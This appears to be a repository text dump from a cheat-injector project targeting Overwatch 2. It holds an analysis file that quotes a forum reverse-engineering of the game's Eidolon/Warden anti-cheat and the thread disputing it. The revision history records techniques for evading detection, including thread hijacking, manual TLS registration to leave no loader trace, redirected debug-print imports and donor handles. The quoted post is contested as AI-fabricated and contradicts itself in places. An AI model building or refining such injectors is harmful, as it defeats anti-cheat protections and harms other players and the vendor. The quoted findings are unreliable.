# TASK-001 Census: Verbatim Non-Cpp Text Artifacts

Complete content for every non-.cpp text artifact in repo tree, then Mapper tree. No truncation.
### .analysis â€” 2036 lines â€” sha12:40E520FE1C8E
```markdown
# Eidolon & Warden â€” Overwatch 2 â€” Consolidated Analysis

**Status:** REWRITTEN 2026-10-15 from primary sources. Playwright/Edge unavailable on host;
all thread bodies below were retrieved via reader-proxy after direct `WebFetch` returned
HTTP 403 (Cloudflare) on every `unknowncheats.me` URL.

**How to read this file**

| Part | Contents | Trust |
|------|----------|-------|
| A | OP text of thread 761091, preserved verbatim | Source record. Not endorsed. |
| B | Reply thread 761091 pp.1â€“3 â€” the dispute, verbatim | Source record |
| C | Three additional threads not previously covered | Source record |
| D | Verification: what is wrong, and why (platform-level) | Analysis |
| E | **RETRACTED** â€” the `0xCC` demand-paging theory, killed by our own measurement | See E0 before reading |
| D6a | **2026-10-21 scope + handle correction** â€” our census was per-module; the launcher's environment knobs were dead (elevation) | Analysis |
| E1a | **2026-10-21 scope correction** â€” our census was per-module, not process-wide; E1's discriminator was already answered | Analysis |
| F | Implications for this injector + our live measurements | Analysis |
| G | Open questions | â€” |
| H | Sources + access log | â€” |
| K | Kernel phase: K0 census crash, fix and baseline | Analysis |

**Revision history**
- 2026-10-15 (a) â€” full rewrite from primary sources; 7 thread bodies retrieved after 403s.
- 2026-10-15 (b) â€” **Part E retracted** after our own live census of `Overwatch.exe`
  (PID 10244) measured 1,199,181 `0xCC` bytes at runtime, not 0. OP Â§1 (1 import), Â§3.2
  (76 exports) and Â§1 (3 TLS callbacks) **confirmed** by read-back; OP Â§3.1
(`GuardFlags: 0x100`) **confirmed exactly** - `0x00000100`, load config 320. See D13a, D6a, E0.
- 2026-10-21 (c) - **scope correction (E1a) and handle-policy correction (F1c).** Our own
  census was described here as "process-wide"; it was bounded to the target's main module
  image range, and the report line that said otherwise was mislabelled. E1's "is it in-image
  or in free space" discriminator was therefore already answered (all in-image), and F5
  items 4, 5, 6 and 11 are now closed in the tooling: the survey reads the exe's own
  `GuardFlags`, reports the in-image / free-space split, states its range, prints the
  single import's module and function name, and locates the loader by its encrypted-core
  section rather than by name. F1c's "the launcher retains only 0x1010" was wrong - it
  opens `0x0410` first - and the "UNKNOWN, never clean" claim is withdrawn. The region
  *shape* (894 executable / 895 no-access regions inside one image) is promoted from
  "unattributed count" to the strongest live lead in the corpus. See E1a, F1a, F1c, F3,
  F4, F5, G5.
- 2026-10-21 (d) - **the first live read-backs of the real target, and a verdict of ours that
  was wrong.** The corrected survey ran against `Overwatch.exe` - twice, against two
  different game processes (PIDs 23184 and 6924) - and the load succeeded with the
  verification gate passing both times. It produced results that close open questions, and
  one that overturns a conclusion this file had carried since the first read-back.
  **The single import is now named: `Overwatch_loader.dll!Ordinal 1`** - the
  name he resolved separately rather than the import name. **The loader's encrypted core
  was located structurally**: `Overwatch_loader.dll` -> `.eid`, 4,672 KB, never read,
  against the OP's "4.2 mb". And **the region shape is now measured rather than
  argued**: of 14,202 no-access regions, 900 are inside the module images and 13,302 in
  free space, and `Overwatch.exe` alone has 899 executable regions against 900 no-access
  regions in its own image. **The verdict that was wrong is D6a.** The target's own load
  config reads `GuardFlags = 0x00000100` with a 320-byte load config - the OP's two
  load-config claims, exactly. This file had recorded them as "CONTRADICTED" because it
  compared the OP's load-config *declaration* against the process CFG *policy* and read the
  difference between two different fields as a refutation. The OP read the field he said
  he read, correctly. The corrected verdict is in D6a, and it is propagated through D13a,
  E2, F1a and the bottom line.
- 2026-10-21 (e) â€” **three findings from an end-to-end verification run of our own
  tooling**, all of them about us rather than about the target. **F4a:** the launcher runs
  elevated, and an elevated process gets a fresh environment â€” so *every* `AMEGER_*`
  environment knob was dead, including the census bounds and the new donor-owner block
  list; all of them now live in the configuration file, which is read after the elevation.
  **F4b:** the exe's own `GuardFlags` is now readable, and on the first system image read
  back it came to `0x00017500` with a load config of exactly 320 bytes â€” the OP's
  "Load Config Size: 320 Bytes" reproduced, and D6a Reading A confirmed. **F4c:** the donor
  handle owner is screened by name before that owner is opened; 399 owners were skipped in
  the verification run and the donor came from `svchost.exe` rather than `lsass.exe`.
- 2026-10-25 (f) â€” **the mitigation pass: every open usermode vector in this file and in
  the gap review was fixed, measured, or recorded, and two of this file's own claims were
  corrected by the runs.** The corrections: **F1b's "a clean process has zero private-RX"
  baseline does not hold for the target** â€” a fresh, un-injected `Overwatch.exe` carries
  2 private-RX regions of its own (measured 2026-10-25, PID 14616: 4 process-wide, this
  load contributed exactly 2); the notepad-derived baseline is retired for attribution
  purposes and the census now attributes by address range. **F4's "No handler installed in
  the target" is a two-mechanism rule again** â€” the payload's `OutputDebugStringA/W`
  imports are redirected to a bare `ret` in ntdll (never raised at all), and a
  first-chance guard covers dependency-internal debug-print exceptions after the
  redirect-only variant was *measured* killing a bare notepad (exit code `0x40010006` =
  `DBG_PRINTEXCEPTION_C`, via `D3DCOMPILER_47`'s init). The F1c handle-rights decision is
  made (`0x1010` standing, escalation only on a refused census probe, debug-port reports
  UNKNOWN by name). The full ledger is **Part F6**.
  Structural shape reproduced a **third** time in the same pass: 916/917 executable/
  no-access region pairing (F2c said 899/900, F2c-2 said 884/885 â€” the ratio holds to one
  apart across three sessions while the absolute counts move with paging).
- 2026-10-25 (g) â€” **the last eliminable in-target trace is gone: the TLS registration
no longer goes through the loader.** The shell's TLS stage now takes the index from
`TlsAlloc`, allocates the template block on the loader heap, installs it in the hijacked
thread's slot with `TlsSetValue`, and patches the image's `_tls_index` (A10). No
fabricated `LDR_DATA_TABLE_ENTRY`, no DDAG node, no `LdrpHandleTlsData`, no loader lock,
no `LdrpTlsList` entry - and therefore no cross-thread template spread into threads the
target creates afterwards. The registration's whole footprint is one PEB `TlsBitmap` bit,
one TEB slot and one heap block; the failure unwind in `MMI_CleanUp` restores the image's
index, scrubs the block and frees the slot. Also this pass: the successful-run transcript
stays on disk by standing choice (`DiscardResultLogOnSuccess = N`; the record of a
successful load is the one worth having), and the console now states the disposition
that actually happened at the end of every run. The accepted
residuals are recorded in F6 (A9's TEB window, the VEH-guard window, the +N dependency
loads with the `LdrRegisterDllNotification` caveat, the working-set/commit quanta, the
launcher's own handle footprint) alongside the host-forensic inventory that is invisible
to the game.

Every claim below is tagged `[SRC]` (a source says it), `[MY]` (my deduction), or
`[UNV]` (unverified / disputed). Thread authors are not authoritative; several are
demonstrably wrong and one thread has been called fabricated (Â§B4).

---

# PART A â€” OP of thread 761091 (verbatim, preserved)

Author: `nohtinginLife`. Published 2026-07-06 17:19 EDT. Build pinned: **Overwatch 2
2.23.0.3.151177**. Author states all offsets were verified live against a running OW2
process over ~24h. Author's own warning: *"these offsets/rvas are for Overwatch 2 Update:
2.23.0.3.151177, which means after this update, those RVAs Would be Wrong."*

> ## First Of All, What is Warden/Eidolon?
>
> Ow2 has 2 layers
>
> **Layer 1 Eidolon (Overwatch_Loader.dll):** Anti Tamper layer responsible for IAT
> encryption, HWID collection, code obfuscation, and integrity verification. And its Acts
> as a loader/guard between the game executable and the Windows API.
>
> **Layer 2 Warden (Overwatch.exe):** Runtime anti-cheat enforcement using Vectored
> Exception Handling (VEH), INT3 trampolines, timing checks, process enumeration, and
> integrity scanning modules.
>
> ### some finds
>
> 1- Overwatch.exe has Exactly (One Import) which "Overwatch_loader.dll!eidolon_run) 0
>    direct win32 imports
> 2- the HWID Decryption Key, Rotates every session, prevents offline decryption tho
> 3- all Warden Module names are Compared via Runtime Hash, no strings cross ref exit in code
> 4- the .eid section ( ig it was 4.2 mb ) stays Encrypted Event in Memory, Decrypted page
>    by page on execution only
> 5- the IAT uses a Cryptographic trampoline where all 31 Dll Imports point to the same
>    Dummy addr statically
> 6- Warden Module Scanning modules (FkCheck, VCheck, IntegrityCk) are ref via a hash
>    table, not direct Lea
>
> ### Now the Main Arch
>
> Overwatch.exe, Has Warden Anticheat, it has :
> 1- VEH ( Exception )
> 2- INT3 Patches ( Trampoline )
> 3- FkCheck, VCheck, IntegrityCk.
> 3- GetTick64 ( Timing )
> 4- NtQuerySysInfo ( Enum Proc )
>
> Import: Overwatch_loader.dll!eidolon_run ( only one )
>
> ### Now, Overwatch_loader.dll Eidolon Anti Tamper Layer
> 1- Encrypted IAT   2- String Decryption   3- Control Flow Flattening
> 4- HWID Collection  5- TLS Callbacks       6- .eid Section ( Encrypted )
>
> ### Now, Arch Points
>
> the critical insight, overwatch.exe has only one imports, which is just
> Overwatch_loader.dll!eidolon_run, every single Windows API Call goes through the loader
> dll encrypted IAT this means:
>
> - Hooking Overwatch.exe IAT is impossible ( there nothing to hook )
> - All Standard API monitors ( API Monitor, process monitor, in API Mode ) see nothing
> - the exe is a stub that delegates everything through the loader
> - any detour must either hook the loader resolved IAT or hook at syscall level
>
> ### Warden Native Anti Cheat â€” 1- TLS Callbacks
>
> 3 TLS Callbacks execute before the Entry Point (eidolon_run)
>
> - TLS Callback 1: RVA: 0x02665714, PEB Anti Debug
> - TLS Callback 2: RVA: 0x02665BB0, VEH Registration
> - TLS Callback 3: RVA: 0x026BC5F0, Thread Env
>
> **Callback 1: PEB Guard** â€” checks BeingDebugged, flag at PEB + 0x2. Checks NtGlobalFlag
> at PEB + 0xBC ( should be 0 for non Debugged ). if Debugger Detected during TLS Phase,
> Calls RtlExitUserProcess Instantly. *"this means even attaching a debugger before the
> entrypoint will be caught, that explain why in cheat engine when u attach a Windows
> Debugger, game closes instantly."*
>
> **Callback 2: VEH Setup** â€” Calls RtlAddVectoredExceptionHandler to register Warden VEH
> Handler. Stores The Handler Handle in a Global Var, for later removal. *"The Handler is
> Registred as a First Chance VEH, not last chance VCH â€” first chance means Warden Get
> every exception before any Debugger"*
>
> **Callback 3: Thread Setup** â€” Init Per Thread Anti Debug Structures. Sets up TLS Data
> for obfuscated Global Var Access. Installs Thread Local Exception Handlers.
>
> ### 3.1 Load Config/ CFG Info ( maybe important )
>
> - Load Config Size: 320 Bytes
> - SE Handler Count: 0, no SEH Handlers, warden uses VEH exclusively
> - SE Handlers Table: 0x0
> - Guard CF Check Func Pointer: 0x02E5C548
> - Guard CF Dispatch Func Ptr: 0x02E5C558
> - Guard Flags: 0x100 ( CFG Instrumented )
>
> *"warden does NOT uses SEH, the SE Handler count is 0, all Exception handling is done
> through VEH this is unusual most apps use SEH for exception Handling"*
>
> ### 3.2 Imports
>
> Overwatch.exe imports is one, Overwatch_loader.dll: Eidolon_Run.
>
> *"this is the single most important finding the game exe does not import from Kernel32.dll
> ( no GetTickCount64, no VirtualAlloc, No CreateThread ) ntdll.dll ( no NtQuerySystemInfo,
> no Rtl Func. ) user32.dll ( no message handling ) any other system dll."*
>
> *"all API goes via eidolon_run -> Encrypted IAT Trampoline -> Real API"*
>
> *"also, overwatch.exe, exports 76 Symbols, this is extremly unusual for an exe.."*
>
> ### 4- Overwatch_loader.dll ( Eidolon Anti Tamper )
>
> **4.1 Section Layout:** `.text` obfsucated code Â· `.rdata` read only data Â· `.data`
> obfuscated data Â· `.pdata` Exception Handlers Â· `.gxfg` CFG Metadata Â· `.tls` Thread
> Local Storage Â· `_RDATA` Custom Read Only Â· `.rsrc` Resources Â· `.reloc` Relocations Â·
> **`.eid` Encrypted Core**
>
> **`.eid`, encrypted core ( ig it was 4.25 mb )** â€” *"its NOT Decrpyted Entirly at runtime,
> section is identical in the static dump and live memory. Decrypted page by page when code
> executes from it. Contains EidolonCore Logic: IAT Res, HWID Collection, Integrity
> Checking. no API Strings Survive in plaintext withen it. 49 False Postive MZ Headers (
> from 0x00 0x00, byte patterns, not actual PEs )"*
>
> **`.data` ( Obfsucated Data )** â€” contains runtime var, encrypted config, and decrypted
> state. Larger Virtual Size than raw size ( 0xCB000 vs 0x1C000 ) zero filled at runtime.
> Likely used for Dynamiclly allocated structures.
>
> **4.3 Exports**
>
> - `eidolon_run` â€” rva:0x62830, first bytes: `c3 cc cc` ( ret sled )
> - `g_warden_aegis_crash_callback_export` â€” rva:0x4DAD38, first bytes `00 00 ..`
>
> *"eidolon_run, the RE Trick â€” the first byte at rva 0x62830 is 0xC3 ( ret instr )
> followed by 7 more 0xCC ( Int3 ) this is not real entrypoint its a ret sled anti analysis
> trick. ... when any tool ( ida, x64dbg, dllmain ) calls this export directly, it instantly
> returns, doing nothing."*
>
> **`g_warden_aegis_crash_callback_export`: Crash Integrity**
>
> | Off | Size | Runtime Content | Meaning |
> |-----|------|-----------------|---------|
> | 0x00 | 8 | 0x0000000000000000 | Callback Pointer, Null Until Crash |
> | 0x08 | 8 | 0x3C435645517CEDB1 | Hash[0:8] |
> | 0x10 | 8 | 0x811CC80D48A94A56 | Hash[8:16] |
> | 0x18 | 8 | 0xC0BD3E8CB8BAD090 | Hash[16:24] |
>
> *"This is a 128 Bit Integrity Hash of the crash callback func ... this prevent: DLL
> Injection that hooks the crash callback / memory patching of the crash handler / callback
> Hijacking via IAT Overwrite"*
>
> **4.4 TLS Callbacks** â€” TLS Callback Array @ RVA 0x39F790. *"only one tls callback in the
> loader ( vs 3 in the exe )"*
>
> **4.5 Decoy Import Table** â€” *"the PE import Directory shows 31 DLLs each with exactly 1
> decoy import"*
>
> | # | DLL | Decoy API(s) | Claimed meaning |
> |---|-----|---------------|-----------------|
> | 1 | Kernel32.dlL | Switch to Thread | Hides Real kernel32 imports |
> | 2 | ntdll.dll | VerSetConditionMask, LdrLockLoaderLock | hide real ntdll imports |
> | 3 | user32.dll | GetAsyncKeyState, EnumWindows | Hides real user32 imports |
> | 4 | GDI32.dll | CreateCompatibleBitmap | Hides real gdi32 imports |
> | 5 | Bcrypt.dll | BcryptDecrypt, BcryptCloseAlgorithmProvider | Crypto ( partailly real ) |
> | 6 | ADVAPI32.dll | RegOpenKeyExW | Used for HWID |
> | 7 | IPHLPAPI.dll | GetAdaptersInfo | used for HWID |
> | 8 | HID.dll | HidD_GetProductString | used for HWID |
> | 9 | sfc.dll | SfcIsFileProtected | Used for Integrity |
> | 10 | Crypt32.dll | CryptMsgGetParm | crypto |
> | 11 | WS2_32.dll | listen | Networking |
> | 12 | d3d11.dll | D3D11CreateDevice | Rendering |
> | 13 | dxgi.dll | CreateDXGIFactory | Rendering |
>
> *"Critical Observation, all 31 IAT Entires point to the same addr 0x007BC878 runtime,
> static is 0x004AC878 with the same placeholder data (0x000002B968630000 in static dump,
> 0x5CE9F34A36F45570 at runtime ) this is the unifed encrypted IAT Trampoline"*
>
> ### 5- Encrypted IAT
>
> **5.1 Mechanism**
> 1- game code call [IAT_slot] all 31 dll IAT slots point to the same unifed trampoline at
>    RVA 0x4AC878
> 2- Static dump shows placeholder bytes (0x000002B968630000), runtime shows resolved
>    pointer (0x5CE9F34A36F45570)
> 3- On first call: Eidolon hashes the API name & DLL name, looks up the index, decrypts
>    the real entry from .eid section, calls LdrGetProcedureAddress to resolve, caches the
>    result
> 4- Subsequent calls: jumps directly to cached real API through the trampoline
> 5- Every single Win32 API call goes through this, zero direct imports exist
>
> **5.2 Runtime Verification**
>
> | | RVA | Bytes | OP's interpretation |
> |--|-----|-------|---------------------|
> | Static | 0x4AC878 | `00 00 00 63 B9 68 02 00 00 00` | Obfuscated placeholder (not a valid pointer) |
> | Runtime | 0x005CC878 | `5C E9 F3 4A 36 F4 55 70` | Resolved pointer to a real function or dispatcher stub |
>
> *"the runtime value 0x7055F4364AF3E95C (reversed for big-endian) is: 1- A valid usermode
> address (in the 0x7FFE... range after ASLR adjustment) 2- Actually points to a resolver
> stub in `.text` that handles the API dispatch"*
>
> **5.3 Res Process**
> - *Phase 1, Static Load ( PE Loader )* â€” Windows PE Loader sees the Decoy Import Table,
>   writes the Placeholder Trampoline addr to all IAT Slots, *"game starts with non
>   functional IAT"*
> - *Phase 2: Eidolon_Run Init* â€” Decrypt the Real Import Mapping from .eid Section. For
>   Each Required API: computes HASH -> looks up in .eid table -> gets api name -> resolves
>   via LdrGetProcedureAddress. *"but does not overwrite the IAT Slots directly, uses a
>   separate dispatch table"*
> - *Phase 3: Lazy Res* â€” some APIs are resolved lazily ( on first call ); the unfied
>   trampoline checks a cache, resolves if needed then calls. *"cache entries are stored in
>   the .data section"*
>
> **5.4 Dll Loading List** (41 DLLs)
> ```
> ntdll.dll kernel32.dll kernelbase.dll
> user32.dll gdi32.dll gdi32full.dll
> msvcrt.dll msvcp_win.dll ucrtbase.dll
> advapi32.dll sechost.dll rpcrt4.dll
> ole32.dll combase.dll oleaut32.dll
> shlwapi.dll shell32.dll shcore.dll
> ws2_32.dll iphlpapi.dll winhttp.dll
> bcrypt.dll crypt32.dll wintrust.dll
> hid.dll setupapi.dll cfgmgr32.dll
> d3d11.dll dxgi.dll dwmapi.dll
> winmm.dll bink2w64.dll vivoxsdk.dll
> comctl32.dll sfc.dll sfc_os.dll
> version.dll sensapi.dll uxtheme.dll
> ```
>
> ### 6- Warden VEH Mechanism
>
> **Exception Flow:**
> ```
> CPU Exception ( int3, access violation ) -> KiUserExceptionDispatcher (ntdll) -> VEH Chain
>   ( first chance ) -> Warden VEH Handler ( Registered by TLS CB ) ->
>   INT3 from CFG Guard  -> Validate + Emu
>   INT3 from Warden Patch -> Validate + Emu
>   INT3 from unknown -> Check Call site
>   other exception -> pass through
> for the VEH Chain, -> Other VEH Handlers too.
> for the KiUserExceptionDIspatcher, -> SEH Chain ( if VEH Returns CONTINUE_SEARCH )
> KiUserExceptionDIspatcher -> UnHandledExceptionFilter, as a last resort.
> ```
>
> **6.2 VEH Registration** â€” `RtlAddVectoredExceptionHandler` in ntdll.dll, runtime addr
> `ntdll!0x0009DE30`, caller: tls Callback 2 in overwatch.exe at `0x02665BB0`.
>
> **6.3 VEH Chain Structures ( win10 x64 )** `[SRC â€” layout is contested, see D9]`
> ```c
> struct _VECTORED_HANDLER_ENTRY {
>     LIST_ENTRY ListEntry;  // +0x00: Flink (8) and Blink (8)
>     LONG       RefCount;   // +0x10: Reference count (4)
>     PVOID      Handler;    // +0x18: Function pointer (8)
>     ULONG_PTR  Pad;        // +0x20: Padding/alignment
> };
> ```
> ```
> VEH 1: Handler=ntdll!RtlpExceptionHandler (default ntdll handler)
> VEH 2: Handler=Overwatch.exe!WardenVEHHandler (Warden's handler)
> VEH 3: Handler=... (any other registered handlers)
> ```
> *"On Windows 10 22H2+, the VEH chain may not be directly walkable from usermode without
> proper sync the chain is protected by a lock (RtlpVectoredHandlerLock)."*
>
> **6.4 INT3 Patch Mechanism**
> 1- warden patches game code, replaces legitmate intr bytes with 0xcc ( int3 )
> 2- when pathched code executes, int3 fires, KiUserExceptionDispatcher -> VEH Chain
> 3- warden handler Inspects exception: address of int3 ( from EXCEPTIOn_RECORD.ExceptionAddress )
>    / contents of surrounding memory / thread context ( registres )
> 4- if valid warden patch handler emulates the original instr: reads the saved original
>    bytes from warden patch database, modfies thread context (context structures ) to
>    emulate the instr, returns exception_continue_execution
> 5- if unknown int3 handler may: return exception_contnue_search / log the violation for
>    server side reporting / trigger integrity check failure ( MemoryTasHasFailed )
>
> ```
> static dump of overwatch.exe .text is like 1.2M Int3 bytes
> runtime scan of overwatch.exe .text 0 int3 bytes
> runtime scan of overwatch_loader.dll .text 24k int3 bytes
>
> the 1.2M INT3 in static dump is CFG ( control flow guard ) not warden patches..
> ```
>
> ### 7- Warden Module System
>
> *"Warden has Internal Scanning modules, ref by name, these not loaded from a external
> files, they are natvie code paths withen overwatch.exe itself, activated by a module
> loader/dispatcher"*
>
> | # | Module Name | Runtime RVA | String First Bytes | Claimed Purpose |
> |---|-------------|-------------|--------------------|-----------------|
> | 1 | FkCheck | 0x34645E8 | `46 6B 43 68 65 63 6B 00` | file integrity check |
> | 2 | VCheck | 0x3464A54 | `56 43 68 65 63 6B 00 00` | Memory Validation Check |
> | 3 | IntegrityCk | 0x3464960 | `49 6E 74 65 67 72 69 74 79 43 6B 00` | Code Integrity Scan |
> | 4 | Quick_Check | 0x3459480 | `71 75 69 63 6B 5F 63 68 65 63 6B` | Fast Integrity Sweep |
> | 5 | MemoryTestHasFailed | 0x395E8A4 | `4D 65 6D 6F 72 79 54 65 73 74 48 61 73 46 61 69 6C 65 64` | Integrity Failure Callback |
>
> **7.2 Hash Table Mechanism** â€” *"The module names are stored in .rdata but are never
> referenced via direct LEA instructions. Instead, Warden uses a runtime hash table"*
> ```
> Hash = HashFunction(ModuleName)   // CRC32 Variant or custom rolling
> Index = Hash & (TableSize -1) -> Table[Index]: { Hash Stored, Module Entry Point, Module Metadata }
> if collision linear probing -> result: module code addr or null
> ```
> *"that explains why: IDA Shows 0 xrefs to the module name strings / x64dbg cannot find
> refs via find ref to current / string search withen code does not help"*
>
> **7.3** â€” one direct code ref found: `MemoryTestHasFailed` RVA 0x395E8A4, LEA Ref at RVA
> 0x4F2A02, *"only module stringwith a direct code xref"*.
>
> **7.4 Module Loader Hints** â€” *"No NtAllocateVirtualMemory syscall found in the loaders
> .text sample"* â†’ *"The most likely approach is 3, Warden pre allocates a pool of RWX
> memory during initialization and loads scanning modules into this pool. This avoids
> runtime VirtualAlloc calls that could be hooked."*
>
> ### 8- Eidolon String Decryption System
>
> Module: Overwatch_loader.dll Â· RVA: **0xEEA40** Â· size: 500 bytes Â· *"Decrypts HWID
> Registry path strings at runtime"*
>
> ```
> 0x00 41 56                    push r14
> 0x02 56                       push rsi
> 0x03 57                       push rdi
> 0x04 55                       push rbp
> 0x05 53                       push rbx
> 0x06 48 81 EC 80 00 00 00     sub rsp, 0x80
> 0x0D 8B 05 BD C9 3D 00        mov eax, [rip+0x3DC9BD]
> 0x13 89 C1                    mov ecx, eax
> 0x15 81 F1 05 24 77 4A        xor ecx, 0x4A772405
> 0x1B 41 89 C8                 mov r8d, ecx
> 0x1E 41 81 C0 87 28 02 37     add r8d, 0x37022887
> 0x25 41 81 F0 B3 17 7F 12     xor r8d, 0x127F17B3
> 0x2C 41 29 C0                 sub r8d, eax
> 0x2F 42 8D 04 01              lea eax, [rcx+r8]
> 0x33 05 87 28 02 37           add eax, 0x37022887
> 0x38 8D 84 01 C5 0E 40 0B     lea eax, [rcx+rax*1+0xB400EC5]
> 0x3F 89 44 24 04              mov [rsp+4], eax
> 0x43 B8 C0 92 59 1B           mov eax, 0x1B5992C0
> 0x48 B9 17 00 00 00           mov ecx, 0x17
> 0x4D 8D 34 01                 lea esi, [rcx+rax]
> 0x50 C1 E6 08                 shl esi, 8
> 0x53 0F B7 0C 24              movzx ecx, word ptr [rsp]
> 0x57 B8 01 00 00 00           mov eax, 1
> ... continues decrypt loop
> ```
>
> **8.3 Key Derivation Chain**
> ```
> global_key = read_uint32(key_addr)            // e.g. 0xC9EF16A9
> layer1 = global_key ^ 0x4A772405
> layer2 = (layer1 + 0x37022887) & 0xFFFFFFFF
> layer3 = layer2 ^ 0x127F17B3
> layer4 = (layer3 - global_key) & 0xFFFFFFFF
> ```
> Layer 1: Initial string XOR mask Â· Layer 2: Address/offset obfuscation Â· Layer 3: Final
> XOR pass Â· Layer 4: Checksum validation
>
> **8.4 Global Key Data At Runtime** â€” `loader_base + 0x3DB410`
> ```
> 8C 24 F8 02 00 00 4C 21 F0 48 F7 D0 75 4F 86 F6 | .$....L!.H..uO..
> 74 16 66 90 66 90 C6 C3 79 F6 DD 80 C1 F3 F6 D8 | t.f.f...y.......
> 0F 85 AD 8B 01 00 56 E8 74 17 01 00 7B ED 50 81 | ......V.t...{.P.
> C0 90 75 2C 82 E8 53 28 00 00 80 E8 BD C7 C1 42 | ..u,..S(.......B
> ```
> `"DWORD[0] = 0x02F8248C (global decryption key, session 2)"` and
> `"DWORD[0] = 0xC9EF16A9 (global decryption key, session 1)"` â€” **listed twice for the
> same DWORD.**
>
> **8.5** â€” reverse-engineered pseudocode `decrypt_eidolon_string(encrypted_bytes, global_key)`
> published in full; k1..k4 per 8.3, then
> `decrypted_byte = encrypted_bytes[i] ^ k_byte ^ k_byte2 ^ (i & 0xFF)` with
> `rolling_key = ((rolling_key << 3) | (rolling_key >> 29)); rolling_key ^= k2;`
>
> ### 9- HWID Collection Chain
>
> *"Eidolon collects hardware identifiers from 6 distinct sources"* â€” then lists **eight**:
>
> | Source | Path / API |
> |--------|-----------|
> | CPU Information | `HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0` â†’ `ProcessorNameString` |
> | Registry, Machine GUID | `HKLM\SOFTWARE\Microsoft\Cryptography` â†’ `MachineGuid` |
> | Disk Hardware ID | `HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e967-e325-11ce-bfc1-08002be10318}\0` â†’ `HardwareID` |
> | MAC Address | `IPHLPAPI!GetAdaptersInfo` |
> | Peripheral Identifiers | `HID!HidD_GetProductString` |
> | Volume Serial | `KERNEL32!GetVolumeInformationW` |
> | Computer Name | `KERNEL32!GetComputerNameW` |
> | User Name | `KERNEL32!GetUserNameW` |
>
> **9.2 HWID Collection Flow**
> 1- String decryption, RVA 0xEEA40 decrypts registry path strings
> 2- Registry Enumeration, RegOpenKeyExW -> RegQueryValueExW -> RegCloseKey
> 3- Additional HWID Sources, GetAdaptersInfo, HidD_GetProductString, GetVolumeInformationW,
>    GetComputerNameW, GetUserNameW
> 4- String Concatenation, All values joined into canonical string
> 5- SHA 1 Hashing, First hash pass (constants @ RVA 0x1BD7F1A)
> 6- RC4 Encryption, Custom RC4 with modified KSA (key @ RVA 0x2599931)
> 7- RSA Encryption, Blizzard public key â†’ encrypted HWID blob
> 8- Base64 Encoding, `CryptStringToBinaryW` -> final payload
> 9- Sent to Auth Server, Via HTTPS in game connection flow
>
> **9.4** â€” *"The SHA-1 and RC4 implementations use hardcoded constants found at these
> locations in Overwatch.exe"*: SHA-1 `K[0]=0x5A827999`, `K[1]=0x6ED9EBA1`, `K[2]=0x8F1BBCDC`,
> `K[3]=0xCA62C1D6` @ RVA 0x1BD7F1A; RC4 @ RVA 0x2599931, *"Modified to include a
> round-dependent counter value in the swap operation"*.
>
> ### 10- PEB Based Checks
> ```
> PEB Structure (x64):
> +0x002: BYTE  BeingDebugged -> 0 = not debugged, 1 = debugged
> +0x003: BYTE  BitField -> Contains ImageUsedOs2 flag
> +0x0BC: ULONG NtGlobalFlag -> 0 = normal, non-zero = debugger flags
> ```
> Detection methods Warden can use: `IsDebuggerPresent()`; `CheckRemoteDebuggerPresent()`
> *"queries csrss.exe"*; `NtQueryInformationProcess(ProcessDebugPort)`;
> `...ProcessDebugFlags`; `...ProcessDebugObjectHandle`.
>
> ### 11.3 Timing Detection â€” *"Warden uses GetTickCount64 ... Expected delta: Normal
> (sub-millisecond for simple operations). Detection threshold: Delta > expected Ã— 2"*
>
> ### 11.4 Control Flow Flattening (Eidolon) â€” normal vs flattened switch-dispatch.
>
> ### 11.5 Global Decryption Key (Rotating) â€” Session 1: `0xC9EF16A9`; Session 2: `0x02F8248C`
>
> ### 11.6 Process Debug Port â€” `NtQueryInformationProcess(ProcessDebugPort)`: DebugPort = 0
>
> *"hope to see blizzard switch to kernel anticheat :sob:"*

---

# PART B â€” Reply thread 761091, pp. 1â€“3 (verbatim record)

Thread is 3 pages, 40 posts. Roughly 60% is flame war. Technical content extracted below.

## B1. The central dispute: where does Warden live?

Trigger is post #4 (`donttalktome555`): *"Layer 2 Warden ( Overwatch.exe ) ?????"*

| Post | Who | Substance |
|------|-----|-----------|
| #4 | donttalktome555 | *"warden does not reside in the overwatch executable"* (#18) |
| #6 | betsit | *"this is pure ai slop and most of it is just hallucination"* |
| #7 | nohtinginLife | *"every offset was verified against ow2 proc while it running, i even wrote a c++ exe that independently confirms all my finds live against Overwatch.exe... if something looks wrong point it out the specific offset"* |
| #8 | betsit | *"if you would have actually ever reversed anything you wouldn't be so uncertain about everything you post."* |
| #10 | betsit | *"you're the person who claimed warden is in overwatch_loader.dll which says a lot about your expertise lmao."* â€” i.e. self-identified Blizzard employee, disputes OP's architecture |
| #11 | nohtinginLife | *"in this post i literally wrote 2 layers, warden in overwatch.exe, the other post was before i knew better"* |
| #13 | nohtinginLife | *"how do you claim it's AI? ... ai can post hex dump?"* |
| #18 | donttalktome555 | *"considering warden modules can be updated while the game is running, would you say that is the case given your 'analysis' on all of the modules being integrated in the executable (which would literally render the entire anticheat useless if they were this easy to reverse)?"* |
| #22 | donttalktome555 | *"they are streamed which would render whatever nonsense you just replied invalid. this so-called 'loader' is just anti-tamper"* |
| #24 | donttalktome555 | *"if they were streamed (which they are, news flash), why would they be stored in the binary?"* |
| #26 | donttalktome555 | *"if a random string along the lines of 'warden_module_integrity_check' appeared in the binary, would you instantly shift your narrative to 'a new module appeared'? could you point me to what led you to believe those strings are specifically warden module names?"* |
| #30 | donttalktome555 | *"look around further and you will see that they aren't always running, let alone all of them at once. they run for a brief moment and once their task is done, they r freed"* |
| #32 | donttalktome555 | *"you're feeding people who may be trying to learn disinformation and they pass that along"* |
| #36 | donttalktome555 | *"you should learn to accept you're wrong"* |
| #37 | nohtinginLife | *"36 posts, with 0 technical content, just 'you are wrong' ... 0 proof, 0 testing"* |

## B2. The single most useful technical claim in the replies `[SRC]`

Post #40, `str4ever1`, h4x0!2, reputation 964 / rep-power 161:

> **"Warden exists outside of the binary and the warden modules are streamed via their JAM
> payload functions... feel free to hook them yourself and see that is the truth. Just
> because the game has CRCs doesn't mean thats warden. You should not blindly trust your AI
> that much if you dont know what you are doing."**

**"JAM payload functions"** is the operative term and appears nowhere in the OP. It is also
corroborated independently by **Post #38, `arnab18`**: *"hey claude, please write a realistic
fake post for UnknownCheats about Eidolon-Warden â€” rep+ bro wasted a lot of ai tokens on
this."* The thread OP is alleged to be AI-fabricated. **This claim is unproven but it is not
frivolous** â€” see Part E, where the OP's own 0xCC data supports it.

## B3. The "streamed" argument, stated fairly `[MY synthesis of B1]`

The strongest form of the challengers' case is not "your offsets are wrong" â€” it is:

